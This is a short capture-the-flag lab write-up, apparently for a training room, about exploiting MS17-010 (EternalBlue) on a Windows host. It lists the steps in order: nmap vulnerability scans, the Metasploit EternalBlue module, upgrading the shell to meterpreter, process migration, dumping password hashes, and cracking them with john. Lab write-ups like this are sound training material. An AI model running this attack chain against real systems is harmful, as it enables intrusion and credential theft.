# Task1

Scan ports under 1000
```bash
nmap -p 1-999 TARGET_IP_ADDRESS_OR_IP_RANGE

nmap  -sV -sC --script vuln -oN blue.nmap 10.10.177.88
```

```bash
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```
There are 3 ports open and it is vunrable to the ms17-010.

# Task2 

Start the Metsploit with `msfconsole` and `search ms17-010`. The module for attacking this system is `exploit/windows/smb/ms17_010_eternalblue`.

```bash
msfconsole
>search ms17-010
>use 0
>show options
>set rhosts <Target_IP>
>run
```
After that Ctrl+z to bring to background.

# Task3 

Convert shell to meterpreter.
```bash
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
show options
```

The SESSION required to be changes.
```bash
sessions
set session 1 
run
sessions
sessions -i 2
getuid

# find the spool process ID
ps
migrate 1296
```

# Task4 
```bash
# In the meterpreter
hashdump
```

To crack this we need to copy the hash to the file and use john to crack it.

```bash
john jon.hash --format=NT --wordlist=/opt/rockyou.txt --show
```
